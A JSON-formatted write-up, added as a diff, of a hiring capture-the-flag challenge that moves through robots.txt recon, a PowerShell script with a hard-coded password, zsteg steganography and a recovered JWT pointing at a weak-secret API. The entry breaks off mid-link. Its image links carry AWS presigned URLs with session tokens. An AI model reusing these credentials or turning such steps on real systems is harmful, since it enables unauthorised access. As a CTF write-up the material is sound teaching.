@@ -1,0 +1,337 @@
+{
+  "id": "36f3405d-7b65-80d1-9c87-eb1751a715b1",
+  "title": "Vanguard Cyber hiring CTF -Operation MERIDIAN",
+  "slug": "vanguard-cyber-hiring-ctf",
+  "type": "multi ctf",
+  "platform": "CTF",
+  "difficulty": "easy",
+  "tags": [
+    "web",
+    "DFIR",
+    "Stegnography",
+    "OSINT"
+  ],
+  "published": true,
+  "featured": true,
+  "date": "2026-05-29",
+  "cover": "https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?auto=format&fit=crop&q=80&w=1200",
+  "summary": "a mix of many techniques , web , stegno , DFIR , ",
+  "blocks": [
+    {
+      "type": "paragraph",
+      "content": "only thing they provided is a linked in post\n"
+    },
+    {
+      "type": "paragraph",
+      "content": "here only one hint Not everything interesting on a website is meant for humans \n\ntheir website :https://vanguardcyber.com.au/ "
+    },
+    {
+      "type": "paragraph",
+      "content": "checked robots.txt and got "
+    },
+    {
+      "type": "code",
+      "content": "User-agent: *\nAllow: /\n\nSitemap: https://vanguardcyber.com.au/sitemap.xml\n\n# is this meant to be here?\n# /internal/staff-directory.html",
+      "language": "javascript"
+    },
+    {
+      "type": "paragraph",
+      "content": "from the above endpoint "
+    },
+    {
+      "type": "image",
+      "content": "https://prod-files-secure.s3.us-west-2.amazonaws.com/7a19a792-95ed-444b-9a77-2b1a0193aa5e/6d2395d5-a02e-47c4-8f60-878a9fb82a7c/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466XWZ7UCCS%2F20260608%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260608T094508Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIGH9nSx4jmLTLB7GkrDQrYg6fNdaEELiLO%2FsYn9eXDjQAiB6MD2AFlrnGpnc%2FmzYT8%2ByvCfpoVSOliGwrwxyq0kc5CqIBAiz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMx%2FqkXxp2Fqq3JlBuKtwDAYtwLONnG8HBotIdvliQp%2FQu%2F7Nni%2Fx0vdB5QhkVW%2BA2k2K5qc6Dg4Kh7GyvJeR1AQhW7lug5cVWmS9Y2VynEt1tECjp1F5ScuynYRVPRxNa5AOfO1noiAg75Ic5m9tiovI57iUPat72ekNNxImQ3ea8N313bIMBxN3vKjsRkYeAN%2FmA5G6yGCS1aENXVYUovVSo35jggfL2JOfYXQ%2FHltFFeAoe0GXHQdIw6ewLoG22vdpxqdTerFQwIPvw4G3xW4FuUWCzm4lnxKqp3qJD0ZppGsT4xqhJdSQZ7YHby7G99j213kfuA6oP20q3eXqVDHG4hT6zhfomg53m9HRlDusj86xv0VxszBLjUB5jm4IZSfdLlvzyKtYY%2FqeVpUzVQ5aiXArgH4DtDI9%2FmDXkQgTQ1cPi69eXTUZrE%2F6aKGqqtJPkqqYA5nCGmpFeYgKTSc43rEridkt0LY%2B4PQMwIHXr8uT%2BtBq%2BhiNsxLpWORyU3w112vP%2FCoywRVmUWiC7JW6K0OcVi8PVFizzb3ioColcSOe%2Fp%2BKiqV8EUwVLJiryAXnES8oxE%2FR%2FpwJK%2BGdoz4BsXI4oYnoBRwAiKWRPsKnD5Kk98iYHij%2B1CmQ6I0jsUrp7xgG6hZyNV20w8Zaa0QY6pgE08dweph2OUvBnsPDdF6rGL8om1eTWRgLLmDKE1vQO9pg1KrA9QY5acAqfSVIVNGiR%2FmXTydmICcxVv55QKenNqrN9InsoGEA4SJtY4xvyF5PjvjqhzRB5szQQUDb0O44clG6awj9muwdpbnQaRIb33OOzWECY9%2B9lJ5U75Ehxj1g2V1lcBMiRlE3vLrWHNDiq3oZcyaX7WZZtSaTf8Doq7DHPh%2Bdz&X-Amz-Signature=230488c5074b1c516fb75659a29363581a5909651f5e37a34ec5908d80fc5e5d&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject",
+      "caption": ""
+    },
+    {
+      "type": "paragraph",
+      "content": "the github has 2 repo and the one contain "
+    },
+    {
+      "type": "image",
+      "content": "https://prod-files-secure.s3.us-west-2.amazonaws.com/7a19a792-95ed-444b-9a77-2b1a0193aa5e/42c13845-a52e-49b7-a9f0-c6c3d033e489/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466XWZ7UCCS%2F20260608%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260608T094508Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIGH9nSx4jmLTLB7GkrDQrYg6fNdaEELiLO%2FsYn9eXDjQAiB6MD2AFlrnGpnc%2FmzYT8%2ByvCfpoVSOliGwrwxyq0kc5CqIBAiz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMx%2FqkXxp2Fqq3JlBuKtwDAYtwLONnG8HBotIdvliQp%2FQu%2F7Nni%2Fx0vdB5QhkVW%2BA2k2K5qc6Dg4Kh7GyvJeR1AQhW7lug5cVWmS9Y2VynEt1tECjp1F5ScuynYRVPRxNa5AOfO1noiAg75Ic5m9tiovI57iUPat72ekNNxImQ3ea8N313bIMBxN3vKjsRkYeAN%2FmA5G6yGCS1aENXVYUovVSo35jggfL2JOfYXQ%2FHltFFeAoe0GXHQdIw6ewLoG22vdpxqdTerFQwIPvw4G3xW4FuUWCzm4lnxKqp3qJD0ZppGsT4xqhJdSQZ7YHby7G99j213kfuA6oP20q3eXqVDHG4hT6zhfomg53m9HRlDusj86xv0VxszBLjUB5jm4IZSfdLlvzyKtYY%2FqeVpUzVQ5aiXArgH4DtDI9%2FmDXkQgTQ1cPi69eXTUZrE%2F6aKGqqtJPkqqYA5nCGmpFeYgKTSc43rEridkt0LY%2B4PQMwIHXr8uT%2BtBq%2BhiNsxLpWORyU3w112vP%2FCoywRVmUWiC7JW6K0OcVi8PVFizzb3ioColcSOe%2Fp%2BKiqV8EUwVLJiryAXnES8oxE%2FR%2FpwJK%2BGdoz4BsXI4oYnoBRwAiKWRPsKnD5Kk98iYHij%2B1CmQ6I0jsUrp7xgG6hZyNV20w8Zaa0QY6pgE08dweph2OUvBnsPDdF6rGL8om1eTWRgLLmDKE1vQO9pg1KrA9QY5acAqfSVIVNGiR%2FmXTydmICcxVv55QKenNqrN9InsoGEA4SJtY4xvyF5PjvjqhzRB5szQQUDb0O44clG6awj9muwdpbnQaRIb33OOzWECY9%2B9lJ5U75Ehxj1g2V1lcBMiRlE3vLrWHNDiq3oZcyaX7WZZtSaTf8Doq7DHPh%2Bdz&X-Amz-Signature=b49d6a7f075796f81ad6263e69e571d7364f4c12512cbe99c1fb072be0d684ff&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject",
+      "caption": ""
+    },
+    {
+      "type": "paragraph",
+      "content": "if you check it has 2 commits "
+    },
+    {
+      "type": "image",
+      "content": "https://prod-files-secure.s3.us-west-2.amazonaws.com/7a19a792-95ed-444b-9a77-2b1a0193aa5e/0ca433c7-10ff-45a0-9d81-6dd585f88e59/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466XWZ7UCCS%2F20260608%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260608T094508Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIGH9nSx4jmLTLB7GkrDQrYg6fNdaEELiLO%2FsYn9eXDjQAiB6MD2AFlrnGpnc%2FmzYT8%2ByvCfpoVSOliGwrwxyq0kc5CqIBAiz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMx%2FqkXxp2Fqq3JlBuKtwDAYtwLONnG8HBotIdvliQp%2FQu%2F7Nni%2Fx0vdB5QhkVW%2BA2k2K5qc6Dg4Kh7GyvJeR1AQhW7lug5cVWmS9Y2VynEt1tECjp1F5ScuynYRVPRxNa5AOfO1noiAg75Ic5m9tiovI57iUPat72ekNNxImQ3ea8N313bIMBxN3vKjsRkYeAN%2FmA5G6yGCS1aENXVYUovVSo35jggfL2JOfYXQ%2FHltFFeAoe0GXHQdIw6ewLoG22vdpxqdTerFQwIPvw4G3xW4FuUWCzm4lnxKqp3qJD0ZppGsT4xqhJdSQZ7YHby7G99j213kfuA6oP20q3eXqVDHG4hT6zhfomg53m9HRlDusj86xv0VxszBLjUB5jm4IZSfdLlvzyKtYY%2FqeVpUzVQ5aiXArgH4DtDI9%2FmDXkQgTQ1cPi69eXTUZrE%2F6aKGqqtJPkqqYA5nCGmpFeYgKTSc43rEridkt0LY%2B4PQMwIHXr8uT%2BtBq%2BhiNsxLpWORyU3w112vP%2FCoywRVmUWiC7JW6K0OcVi8PVFizzb3ioColcSOe%2Fp%2BKiqV8EUwVLJiryAXnES8oxE%2FR%2FpwJK%2BGdoz4BsXI4oYnoBRwAiKWRPsKnD5Kk98iYHij%2B1CmQ6I0jsUrp7xgG6hZyNV20w8Zaa0QY6pgE08dweph2OUvBnsPDdF6rGL8om1eTWRgLLmDKE1vQO9pg1KrA9QY5acAqfSVIVNGiR%2FmXTydmICcxVv55QKenNqrN9InsoGEA4SJtY4xvyF5PjvjqhzRB5szQQUDb0O44clG6awj9muwdpbnQaRIb33OOzWECY9%2B9lJ5U75Ehxj1g2V1lcBMiRlE3vLrWHNDiq3oZcyaX7WZZtSaTf8Doq7DHPh%2Bdz&X-Amz-Signature=4d1f702b6b8a8b473ab23ad574cda88e50fedd6d57fd4e741a419d7d83634728&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject",
+      "caption": ""
+    },
+    {
+      "type": "code",
+      "content": "<#\n    Vanguard Cyber - Internal Deployment Automation\n    Author: Kyle Murray\n    Purpose: Automate deployment of internal web applications\n#>\n\nparam(\n    [string]$Environment = \"Production\",\n    [string]$PackagePath = \".\\release.zip\",\n    [switch]$RestartServices\n)\n\n$ErrorActionPreference = \"Stop\"\n\n# Deployment configuration\n$DeployRoot = \"D:\\Deployments\\Portal\"\n$BackupRoot = \"D:\\Backups\\Portal\"\n$LogFile = \"C:\\Logs\\deploy.log\"\n$AppPoolName = \"VCPortal\"\n\n# TODO: Move creds to Azure Key Vault before production rollout\n$DeployUser = \"svc_deploy\"\n$DeployPass = \"Winter2026!\"\n\nfunction Write-Log {\n    param([string]$Message)\n\n    $Timestamp = Get-Date -Format \"yyyy-MM-dd HH:mm:ss\"\n    $Entry = \"[$Timestamp] $Message\"\n\n    Write-Host $Entry\n    Add-Content -Path $LogFile -Value $Entry\n}\n\nfunction Test-Prerequisites {\n    Write-Log \"Checking deployment prerequisites\"\n\n    if (!(Test-Path $PackagePath)) {\n        throw \"Deployment package not found: $PackagePath\"\n    }\n\n    if (!(Test-Path $DeployRoot)) {\n        New-Item -ItemType Directory -Path $DeployRoot | Out-Null\n    }\n\n    if (!(Test-Path $BackupRoot)) {\n        New-Item -ItemType Directory -Path $BackupRoot | Out-Null\n    }\n}\n\nfunction Backup-ExistingDeployment {\n    $Timestamp = Get-Date -Format \"yyyyMMdd_HHmmss\"\n    $BackupPath = Join-Path $BackupRoot \"portal_$Timestamp.zip\"\n\n    Write-Log \"Creating backup: $BackupPath\"\n\n    Compress-Archive -Path \"$DeployRoot\\*\" -DestinationPath $BackupPath -Force\n}\n\nfunction Deploy-Package {\n    Write-Log \"Extracting deployment package\"\n\n    Expand-Archive -Path $PackagePath -DestinationPath $DeployRoot -Force\n}\n\nfunction Restart-PortalServices {\n    Write-Log \"Restarting IIS application pool\"\n\n    Import-Module WebAdministration\n    Restart-WebAppPool -Name $AppPoolName\n}\n\ntry {\n    Write-Log \"Starting deployment for environment: $Environment\"\n\n    Test-Prerequisites\n    Backup-ExistingDeployment\n    Deploy-Package\n\n    if ($RestartServices) {\n        Restart-PortalServices\n    }\n\n    Write-Log \"Deployment completed successfully\"\n\n    # FLAG\n    # VC{r3c0n_b3g1ns}\n\n    # Reminder:\n    # Check the employee handbook cover image on the intranet... something's off about it.\n    # I moved it to ctf-001.vanguardcyber.com.au/intranet-9b4e08b0-44d8-4ef5-bdc0-0004ebe87845/handbook.png\n}\ncatch {\n    Write-Log \"Deployment failed: $_\"\n    throw\n}",
+      "language": "powershell"
+    },
+    {
+      "type": "heading_1",
+      "content": "Flag 1 "
+    },
+    {
+      "type": "paragraph",
+      "content": "VC{r3c0n_b3g1ns}"
+    },
+    {
+      "type": "paragraph",
+      "content": "checking ctf-001.vanguardcyber.com.au/intranet-9b4e08b0-44d8-4ef5-bdc0-0004ebe87845/handbook.png "
+    },
+    {
+      "type": "image",
+      "content": "https://prod-files-secure.s3.us-west-2.amazonaws.com/7a19a792-95ed-444b-9a77-2b1a0193aa5e/2df0e15b-7fcd-436d-b843-1b664dbacb58/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466XWZ7UCCS%2F20260608%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260608T094508Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIGH9nSx4jmLTLB7GkrDQrYg6fNdaEELiLO%2FsYn9eXDjQAiB6MD2AFlrnGpnc%2FmzYT8%2ByvCfpoVSOliGwrwxyq0kc5CqIBAiz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMx%2FqkXxp2Fqq3JlBuKtwDAYtwLONnG8HBotIdvliQp%2FQu%2F7Nni%2Fx0vdB5QhkVW%2BA2k2K5qc6Dg4Kh7GyvJeR1AQhW7lug5cVWmS9Y2VynEt1tECjp1F5ScuynYRVPRxNa5AOfO1noiAg75Ic5m9tiovI57iUPat72ekNNxImQ3ea8N313bIMBxN3vKjsRkYeAN%2FmA5G6yGCS1aENXVYUovVSo35jggfL2JOfYXQ%2FHltFFeAoe0GXHQdIw6ewLoG22vdpxqdTerFQwIPvw4G3xW4FuUWCzm4lnxKqp3qJD0ZppGsT4xqhJdSQZ7YHby7G99j213kfuA6oP20q3eXqVDHG4hT6zhfomg53m9HRlDusj86xv0VxszBLjUB5jm4IZSfdLlvzyKtYY%2FqeVpUzVQ5aiXArgH4DtDI9%2FmDXkQgTQ1cPi69eXTUZrE%2F6aKGqqtJPkqqYA5nCGmpFeYgKTSc43rEridkt0LY%2B4PQMwIHXr8uT%2BtBq%2BhiNsxLpWORyU3w112vP%2FCoywRVmUWiC7JW6K0OcVi8PVFizzb3ioColcSOe%2Fp%2BKiqV8EUwVLJiryAXnES8oxE%2FR%2FpwJK%2BGdoz4BsXI4oYnoBRwAiKWRPsKnD5Kk98iYHij%2B1CmQ6I0jsUrp7xgG6hZyNV20w8Zaa0QY6pgE08dweph2OUvBnsPDdF6rGL8om1eTWRgLLmDKE1vQO9pg1KrA9QY5acAqfSVIVNGiR%2FmXTydmICcxVv55QKenNqrN9InsoGEA4SJtY4xvyF5PjvjqhzRB5szQQUDb0O44clG6awj9muwdpbnQaRIb33OOzWECY9%2B9lJ5U75Ehxj1g2V1lcBMiRlE3vLrWHNDiq3oZcyaX7WZZtSaTf8Doq7DHPh%2Bdz&X-Amz-Signature=c4dea15713ca833826a7b444f56fbc48d534b3e35f7fe13c1598b64a7a5e154f&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject",
+      "caption": ""
+    },
+    {
+      "type": "paragraph",
+      "content": "downloading the image "
+    },
+    {
+      "type": "code",
+      "content": "┌──(root㉿kali)-[/home/kali/Desktop]\n└─# wget https://ctf-001.vanguardcyber.com.au/intranet-9b4e08b0-44d8-4ef5-bdc0-0004ebe87845/handbook.png ",
+      "language": "powershell"
+    },
+    {
+      "type": "paragraph",
+      "content": "checking the file "
+    },
+    {
+      "type": "paragraph",
+      "content": "using zsteg i got "
+    },
+    {
+      "type": "code",
+      "content": "b1,bgr,msb,Xy .. text:\n\"icvR3YhJHdu92YiojIyV2c1Jye.9JCVXpkI6ICc5RnIsIiN1IzUIJiOicGbhJye\n:noisses rotcartnoc ruoy rof denoisivorp neeb sah nekot TWJ A\n\n.IPA latrop eeyolpme eht si tegrat txen ruoY\n.sBSL egami eht ni gnidih saw atad ehT .seye dooG :LETNI EVITAREPO\n\n}n14lp_n1_n3dd1h\"",
+      "language": "powershell"
+    },
+    {
+      "type": "paragraph",
+      "content": "so lets extract all the details and reverse it "
+    },
+    {
+      "type": "code",
+      "content": "                                                                                                                                                                                             \n┌──(root㉿kali)-[/home/kali/Desktop/vg_op_meridian]\n└─# zsteg handbook.png -E b1,bgr,msb,Xy > hidden.txt\n                                                                                                                                                                                             \n┌──(root㉿kali)-[/home/kali/Desktop/vg_op_meridian]\n└─# cat hidden.txt \nicvR3YhJHdu92YiojIyV2c1Jye.9JCVXpkI6ICc5RnIsIiN1IzUIJiOicGbhJye\n:noisses rotcartnoc ruoy rof denoisivorp neeb sah nekot TWJ A\n\n.IPA latrop eeyolpme eht si tegrat txen ruoY\n.sBSL egami eht ni gnidih saw atad ehT .seye dooG :LETNI EVITAREPO\n\n}n14lp_n1_n3dd1h{CV\n\n=== SEDOC SSECCA REBYC DRAUGNAV ===S\n=== SEDOC SSECCA DNE ===\n\n.txetnoc fo tib a si deen uoy lla semitemoS\n.kaew si terces ehT .652SH si mhtirogla gningis ehT\n1001=di?eliforp/1v/538c537f2d7a-694a-7bf4-86d7-7c2d6a00-ipa/ :tniopdnE\n\nI8Tlz4SEJGr33CweTN63UZz7lv_oiHeBA44WSxvL9Rs.QfwADMwADM4IzNxojI0FWaiwSO5ATM6ICZpJCLiIXZ3VWa2JiOiUGbvJnIsII",
+      "language": "shell"
+    },
+    {
+      "type": "code",
+      "content": "──(root㉿kali)-[/home/kali/Desktop/vg_op_meridian]\n└─# rev hidden.txt\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiY29udHJhY3Rvci\nA JWT token has been provisioned for your contractor session:\n\nYour next target is the employee portal API.\nOPERATIVE INTEL: Good eyes. The data was hiding in the image LSBs.\n\nVC{h1dd3n_1n_pl41n}\n\nS=== VANGUARD CYBER ACCESS CODES ===\n=== END ACCESS CODES ===\n\nSometimes all you need is a bit of context.\nThe signing algorithm is HS256. The secret is weak.\nEndpoint: /api-00a6d2c7-7d68-4fb7-a496-a7d2f735c835/v1/profile?id=1001\n\nrev: fgetwc() failed: Invalid or incomplete multibyte or wide character",
+      "language": "shell"
+    },
+    {
+      "type": "heading_1",
+      "content": "Flag 2 "
+    },
+    {
+      "type": "paragraph",
+      "content": "VC{h1dd3n_1n_pl41n}"
+    },
+    {
+      "type": "paragraph",
+      "content": "now lets check the next endpoint "
+    },
+    {
+      "type": "image",
+      "content": "https://prod-files-secure.s3.us-west-2.amazonaws.com/7a19a792-95ed-444b-9a77-2b1a0193aa5e/b303547e-86bb-4f5d-8c0f-baab9b79e184/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466XWZ7UCCS%2F20260608%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260608T094508Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIGH9nSx4jmLTLB7GkrDQrYg6fNdaEELiLO%2FsYn9eXDjQAiB6MD2AFlrnGpnc%2FmzYT8%2ByvCfpoVSOliGwrwxyq0kc5CqIBAiz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMx%2FqkXxp2Fqq3JlBuKtwDAYtwLONnG8HBotIdvliQp%2FQu%2F7Nni%2Fx0vdB5QhkVW%2BA2k2K5qc6Dg4Kh7GyvJeR1AQhW7lug5cVWmS9Y2VynEt1tECjp1F5ScuynYRVPRxNa5AOfO1noiAg75Ic5m9tiovI57iUPat72ekNNxImQ3ea8N313bIMBxN3vKjsRkYeAN%2FmA5G6yGCS1aENXVYUovVSo35jggfL2JOfYXQ%2FHltFFeAoe0GXHQdIw6ewLoG22vdpxqdTerFQwIPvw4G3xW4FuUWCzm4lnxKqp3qJD0ZppGsT4xqhJdSQZ7YHby7G99j213kfuA6oP20q3eXqVDHG4hT6zhfomg53m9HRlDusj86xv0VxszBLjUB5jm4IZSfdLlvzyKtYY%2FqeVpUzVQ5aiXArgH4DtDI9%2FmDXkQgTQ1cPi69eXTUZrE%2F6aKGqqtJPkqqYA5nCGmpFeYgKTSc43rEridkt0LY%2B4PQMwIHXr8uT%2BtBq%2BhiNsxLpWORyU3w112vP%2FCoywRVmUWiC7JW6K0OcVi8PVFizzb3ioColcSOe%2Fp%2BKiqV8EUwVLJiryAXnES8oxE%2FR%2FpwJK%2BGdoz4BsXI4oYnoBRwAiKWRPsKnD5Kk98iYHij%2B1CmQ6I0jsUrp7xgG6hZyNV20w8Zaa0QY6pgE08dweph2OUvBnsPDdF6rGL8om1eTWRgLLmDKE1vQO9pg1KrA9QY5acAqfSVIVNGiR%2FmXTydmICcxVv55QKenNqrN9InsoGEA4SJtY4xvyF5PjvjqhzRB5szQQUDb0O44clG6awj9muwdpbnQaRIb33OOzWECY9%2B9lJ5U75Ehxj1g2V1lcBMiRlE3vLrWHNDiq3oZcyaX7WZZtSaTf8Doq7DHPh%2Bdz&X-Amz-Signature=f0800a901b42339a08ab6ed292331a8c1f41c26590be9094730ca99bb14baa01&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject",
+      "caption": ""
+    },
+    {
+      "type": "paragraph",
+      "content": "\nlets see what’s inside the payload  "
+    },
+    {
+      "type": "code",
+      "content": "┌──(root㉿kali)-[/home/kali/Desktop/vg_op_meridian]\n└─# echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiY29udHJhY3Rvci' | cut -d '.' -f2 | base64 -d 2>/dev/null\n{\"user\":\"contractor   ",
+      "language": "shell"
+    },
+    {
+      "type": "paragraph",
+      "content": "still the payload was half , so if you take the last line  I8Tlz4SEJGr33CweTN63UZz7lv_oiHeBA44WSxvL9Rs.QfwADMwADM4IzNxojI0FWaiwSO5ATM6ICZpJCLiIXZ3VWa2JiOiUGbvJnIsII and reversre it and then append to the above jwt token you will get "
+    },
+    {
+      "type": "code",
+      "content": "┌──(root㉿kali)-[/home/kali/Desktop/vg_op_meridian]\n└─# echo 'I8Tlz4SEJGr33CweTN63UZz7lv_oiHeBA44WSxvL9Rs.QfwADMwADM4IzNxojI0FWaiwSO5ATM6ICZpJCLiIXZ3VWa2JiOiUGbvJnIsI' | rev\nIsInJvbGUiOiJ2aWV3ZXIiLCJpZCI6MTA5OSwiaWF0IjoxNzI4MDAwMDAwfQ.sR9LvxSW44ABeHio_vl7zZU36NTewC33rGJES4zlT8I\n\n\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiY29udHJhY3RvciIsInJvbGUiOiJ2aWV3ZXIiLCJpZCI6MTA5OSwiaWF0IjoxNzI4MDAwMDAwfQ.sR9LvxSW44ABeHio_vl7zZU36NTewC33rGJES4zlT8I\n\n\n# which decodes to \n{\n  \"user\": \"contractor\",\n  \"role\": \"viewer\",\n  \"id\": 1099,\n  \"iat\": 1728000000\n}",
+      "language": "shell"
+    },
+    {
+      "type": "image",
+      "content": "https://prod-files-secure.s3.us-west-2.amazonaws.com/7a19a792-95ed-444b-9a77-2b1a0193aa5e/76ec9967-98d8-4fa4-9297-252b05c55c86/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466XWZ7UCCS%2F20260608%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260608T094508Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIGH9nSx4jmLTLB7GkrDQrYg6fNdaEELiLO%2FsYn9eXDjQAiB6MD2AFlrnGpnc%2FmzYT8%2ByvCfpoVSOliGwrwxyq0kc5CqIBAiz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMx%2FqkXxp2Fqq3JlBuKtwDAYtwLONnG8HBotIdvliQp%2FQu%2F7Nni%2Fx0vdB5QhkVW%2BA2k2K5qc6Dg4Kh7GyvJeR1AQhW7lug5cVWmS9Y2VynEt1tECjp1F5ScuynYRVPRxNa5AOfO1noiAg75Ic5m9tiovI57iUPat72ekNNxImQ3ea8N313bIMBxN3vKjsRkYeAN%2FmA5G6yGCS1aENXVYUovVSo35jggfL2JOfYXQ%2FHltFFeAoe0GXHQdIw6ewLoG22vdpxqdTerFQwIPvw4G3xW4FuUWCzm4lnxKqp3qJD0ZppGsT4xqhJdSQZ7YHby7G99j213kfuA6oP20q3eXqVDHG4hT6zhfomg53m9HRlDusj86xv0VxszBLjUB5jm4IZSfdLlvzyKtYY%2FqeVpUzVQ5aiXArgH4DtDI9%2FmDXkQgTQ1cPi69eXTUZrE%2F6aKGqqtJPkqqYA5nCGmpFeYgKTSc43rEridkt0LY%2B4PQMwIHXr8uT%2BtBq%2BhiNsxLpWORyU3w112vP%2FCoywRVmUWiC7JW6K0OcVi8PVFizzb3ioColcSOe%2Fp%2BKiqV8EUwVLJiryAXnES8oxE%2FR%2FpwJK%2BGdoz4BsXI4oYnoBRwAiKWRPsKnD5Kk98iYHij%2B1CmQ6I0jsUrp7xgG6hZyNV20w8Zaa0QY6pgE08dweph2OUvBnsPDdF6rGL8om1eTWRgLLmDKE1vQO9pg1KrA9QY5acAqfSVIVNGiR%2FmXTydmICcxVv55QKenNqrN9InsoGEA4SJtY4xvyF5PjvjqhzRB5szQQUDb0O44clG6awj9muwdpbnQaRIb33OOzWECY9%2B9lJ5U75Ehxj1g2V1lcBMiRlE3vLrWHNDiq3oZcyaX7WZZtSaTf8Doq7DHPh%2Bdz&X-Amz-Signature=e61736f3681769b0bdcf34cb83cdf34a6b33570d2a68463f4225a04ff35722b9&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject",
+      "caption": ""
+    },
+    {
+      "type": "paragraph",
+      "content": "checking \n"
+    },
+    {
+      "type": "image",
+      "content": "https://prod-files-secure.s3.us-west-2.amazonaws.com/7a19a792-95ed-444b-9a77-2b1a0193aa5e/94731606-4ff2-4701-9063-4aca631f0f0d/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466XWZ7UCCS%2F20260608%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260608T094508Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIGH9nSx4jmLTLB7GkrDQrYg6fNdaEELiLO%2FsYn9eXDjQAiB6MD2AFlrnGpnc%2FmzYT8%2ByvCfpoVSOliGwrwxyq0kc5CqIBAiz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMx%2FqkXxp2Fqq3JlBuKtwDAYtwLONnG8HBotIdvliQp%2FQu%2F7Nni%2Fx0vdB5QhkVW%2BA2k2K5qc6Dg4Kh7GyvJeR1AQhW7lug5cVWmS9Y2VynEt1tECjp1F5ScuynYRVPRxNa5AOfO1noiAg75Ic5m9tiovI57iUPat72ekNNxImQ3ea8N313bIMBxN3vKjsRkYeAN%2FmA5G6yGCS1aENXVYUovVSo35jggfL2JOfYXQ%2FHltFFeAoe0GXHQdIw6ewLoG22vdpxqdTerFQwIPvw4G3xW4FuUWCzm4lnxKqp3qJD0ZppGsT4xqhJdSQZ7YHby7G99j213kfuA6oP20q3eXqVDHG4hT6zhfomg53m9HRlDusj86xv0VxszBLjUB5jm4IZSfdLlvzyKtYY%2FqeVpUzVQ5aiXArgH4DtDI9%2FmDXkQgTQ1cPi69eXTUZrE%2F6aKGqqtJPkqqYA5nCGmpFeYgKTSc43rEridkt0LY%2B4PQMwIHXr8uT%2BtBq%2BhiNsxLpWORyU3w112vP%2FCoywRVmUWiC7JW6K0OcVi8PVFizzb3ioColcSOe%2Fp%2BKiqV8EUwVLJiryAXnES8oxE%2FR%2FpwJK%2BGdoz4BsXI4oYnoBRwAiKWRPsKnD5Kk98iYHij%2B1CmQ6I0jsUrp7xgG6hZyNV20w8Zaa0QY6pgE08dweph2OUvBnsPDdF6rGL8om1eTWRgLLmDKE1vQO9pg1KrA9QY5acAqfSVIVNGiR%2FmXTydmICcxVv55QKenNqrN9InsoGEA4SJtY4xvyF5PjvjqhzRB5szQQUDb0O44clG6awj9muwdp